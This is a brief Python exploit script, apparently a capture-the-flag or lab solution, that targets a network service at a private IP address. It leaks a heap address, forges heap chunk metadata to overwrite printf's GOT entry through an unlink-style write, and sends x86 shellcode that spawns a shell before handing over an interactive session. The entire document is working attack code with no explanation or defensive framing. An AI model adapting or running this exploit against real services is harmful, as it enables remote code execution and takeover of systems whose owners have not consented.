#!/usr/bin/env python
from sc_pwn import *

rhp     = ("192.168.75.129",8080)

addr_got_printf     = 0x804c004

#==========
def attack(nc):
    nc.read_until('address.\n')
    for i in range(10):
        nc.read_until('\n')
    addr = nc.read_until('\n').split(']')[1].split('=')[1]
    addr_heap       = int(addr,16)
    nc.read_all()
    
    info("addr_got_printf    = 0x%08x\n"%addr_got_printf)
    info("addr_heap          = 0x%08x\n"%addr_heap)

    exploit  = pack_32(heap_sb(0xc,PREV_INUSE)) # p->size
    exploit += pack_32(addr_got_printf-0x8)     # p->pd
    exploit += pack_32(addr_heap)               # p->bk
    exploit += pack_32(heap_sb(0xdeadbeef,0))

    shellcode  = '\x90'*2                       # nop
    shellcode += '\xeb\x04'                     # jmp   0x04
    shellcode += pack_32(0xdeadbeef)
    shellcode += ShellCode('x86').sh()

    nc.send(shellcode.ljust(260,'\x00'))
    nc.sendln(exploit)
    nc.read_all()

#==========

if __name__=='__main__':
    nc = Communicate(rhp)
    attack(nc)

    sh = Shell(nc)
    sh.select()

    del(sh)
    del(nc)
    
#==========
